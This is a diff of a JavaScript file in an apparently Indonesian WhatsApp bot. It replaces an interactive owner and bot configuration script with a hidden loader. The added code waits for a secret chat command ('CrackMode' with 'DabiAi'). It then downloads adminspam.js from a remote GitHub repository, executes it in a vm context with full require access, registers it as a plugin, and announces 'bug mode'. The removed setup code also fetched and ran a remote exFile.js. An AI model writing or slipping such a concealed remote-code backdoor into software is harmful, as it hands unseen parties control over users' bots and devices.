@@ -1,96 +1,91 @@
-const fs = require('fs');
-const path = require('path');
-const https = require('https');
-const readline = require('readline');
-const chalk = require('chalk');
-const { colNumb } = require('./toolkit/transmitter.js');
+import fs from 'fs';
+import https from 'https';
+import v from 'vm';
+import path from 'path';
 
-const CONFIG_PATH = path.join(__dirname, './toolkit/set/config.json');
-const EXFILE_PATH = path.join(__dirname, 'exFile.js');
-const EXFILE_URL = 'https://raw.githubusercontent.com/MaouDabi0/Dabi-Ai-Documentation/main/assets/funcFile/exFile.js';
+global.lS = async (filePath) => {
+  try {
+    const code = await fs.promises.readFile(filePath, 'utf8');
+    const script = new v.Script(code, { filename: path.basename(filePath) });
+    const context = v.createContext({ module: {}, exports: {}, require });
+    script.runInContext(context);
+    return context.module.exports || context.exports;
+  } catch (err) {
+    console.error('[lS Error]', err);
+    return null;
+  }
+};
 
-let config = require(CONFIG_PATH);
-const rl = readline.createInterface({
-  input: process.stdin,
-  output: process.stdout
+global.f = (url) => new Promise((resolve, reject) => {
+  https.get(url, res => {
+    let data = '';
+    res.on('data', chunk => data += chunk);
+    res.on('end', () => {
+      resolve({ text: async () => data });
+    });
+  }).on('error', reject);
 });
 
-async function ask(question) {
-  return new Promise(resolve => rl.question(question, answer => resolve(answer.trim())));
-}
+async function h(conn, msg, info, textMessage, mt) {
+  const m = msg;
+  const { chatId } = global.exCht(m);
 
-function downloadExFile(callback) {
-  if (fs.existsSync(EXFILE_PATH)) {
-    console.log(chalk.yellow('exFile.js sudah tersedia secara lokal.'));
-    return callback();
-  }
+  try {
+    await conn.sendMessage(chatId, { text: '⏳ Verifikasi berhasil...' }, { quoted: m });
 
-  const file = fs.createWriteStream(EXFILE_PATH);
-  https.get(EXFILE_URL, response => {
-    if (response.statusCode !== 200) {
-      console.error(`Gagal menyimpan exFile.js: ${response.statusCode}`);
-      return process.exit(1);
+    const baseRawUrl = 'https://raw.githubusercontent.com/MaouDabi0/Dabi-Ai-Documentation/main/assets/src/CdMode';
+    const files = ['adminspam.js'];
+
+    let cnt = 0;
+
+    for (const file of files) {
+      const url = `${baseRawUrl}/${file}`;
+      const res = await f(url);
+      const code = await res.text();
+
+      const context = v.createContext({ module: {}, exports: {}, require });
+      new v.Script(code, { filename: file }).runInContext(context);
+
+      const plugin = context.module.exports || context.exports;
+      if (plugin?.name) {
+        global.plugins[plugin.name] = plugin;
+
+        const tags = Array.isArray(plugin.tags) ? plugin.tags : [plugin.tags || 'other'];
+        tags.forEach(tag => {
+          if (!global.categories[tag]) global.categories[tag] = [];
+          global.categories[tag].push(plugin.name);
+        });
+
+        console.log(`✅ Plugin ${plugin.name} dimuat`);
+        cnt++;
+      }
     }
 
-    response.pipe(file);
-    file.on('finish', () => {
-      file.close();
-      callback();
-    });
-  }).on('error', err => {
-    fs.unlink(EXFILE_PATH, () => {});
-    console.error('Gagal mengunduh exFile.js:', err);
-    process.exit(1);
-  });
+    await conn.sendMessage(chatId, {
+      text: 'Ｂ̴̖́͌̿̄̚Ｕ̴̩̍̀͐Ｇ̶̦̃͋͑͐͊ Ｍ̶͓͒̈́̈́̕Ｏ̶̯͛̐̕Ｄ̴̛̝͠Ｅ̴͎̄͛ Ｂ̵̙̓̕͝Ｙ̷̨͋̿ Ｄ̸͙̿̇̏Ａ̶̦͛́͐Ｂ̵̯̎͌͆Ｉ̸̑̋̿',
+    }, { quoted: m });
+
+    return true;
+  } catch (e) {
+    console.error('[CRCKLOADER]', e);
+    await conn.sendMessage(chatId, { text: '❌ Gagal memuat plugin. Cek log untuk detail.' }, { quoted: m });
+    return true;
+  }
 }
 
-async function setupConfig() {
-  console.log(chalk.greenBright('Silahkan isi beberapa pertanyaan,\nuntuk mengkonfigurasi Nama Bot dll.\n'));
-  console.log(chalk.cyanBright.inverse(`ketik "skip" untuk lanjut`));
+export default async (conn, msg, textMessage) => {
+  if (typeof textMessage !== 'string') return false;
+  if (!global.isPrefix || !Array.isArray(global.isPrefix)) return false;
 
-  const inputNumber = await ask(chalk.cyanBright('Masukkan nomor owner: '));
-  if (inputNumber !== 'skip' && inputNumber !== 'n') {
-    const fullNumber = await colNumb(inputNumber);
-    if (!config.ownerSetting.ownerNumber.includes(fullNumber)) {
-      config.ownerSetting.ownerNumber.push(fullNumber);
-      console.log(chalk.greenBright.inverse(`✓ Nomor ${fullNumber} ditambahkan sebagai owner.\n`));
-    } else {
-      console.log(chalk.redBright.inverse(`Nomor ${fullNumber} sudah terdaftar.\n`));
-    }
-  }
+  const usedPrefix = global.isPrefix.find(pfx => textMessage.startsWith(pfx + '/'));
+  if (!usedPrefix) return false;
 
-  const ownerName = await ask(chalk.cyanBright('Masukkan nama owner: '));
-  if (ownerName !== 'skip' && ownerName !== 'n') {
-    config.ownerSetting.ownerName = ownerName;
-    console.log(chalk.greenBright.inverse('✓ Nama owner diperbarui.\n'));
-  }
+  const args = textMessage.slice((usedPrefix + '/').length).trim();
+  const pattern = /^"CrackMode"\s*:\s*-r=\s*\{"DabiAi"\}$/;
+  if (!pattern.test(args)) return false;
 
-  const contact = await ask(chalk.cyanBright('Masukkan nomor kontak utama owner: '));
-  if (contact !== 'skip' && contact !== 'n') {
-    config.ownerSetting.contact = contact;
-    console.log(chalk.greenBright.inverse('✓ Kontak owner diperbarui.\n'));
-  }
+  const info = exCht(msg);
+  if (!info) return false;
 
-  const botName = await ask(chalk.cyanBright('Masukkan nama pendek bot: '));
-  if (botName !== 'skip' && botName !== 'n') {
-    config.botSetting.botName = botName;
-    console.log(chalk.greenBright.inverse('✓ Nama bot diperbarui.\n'));
-  }
-
-  const botFullName = await ask(chalk.cyanBright('Masukkan nama lengkap bot: '));
-  if (botFullName !== 'skip' && botFullName !== 'n') {
-    config.botSetting.botFullName = botFullName;
-    console.log(chalk.greenBright.inverse('✓ Nama lengkap bot diperbarui.\n'));
-  }
-
-  fs.writeFileSync(CONFIG_PATH, JSON.stringify(config, null, 2));
-  console.log(chalk.green.italic.bold('✓ Konfigurasi berhasil disimpan ke config.json'));
-  rl.close();
-
-  downloadExFile(() => {
-    const { exFile } = require(EXFILE_PATH);
-    exFile();
-  });
-}
-
-module.exports = setupConfig;
+  return await h(conn, msg, info, textMessage);
+};
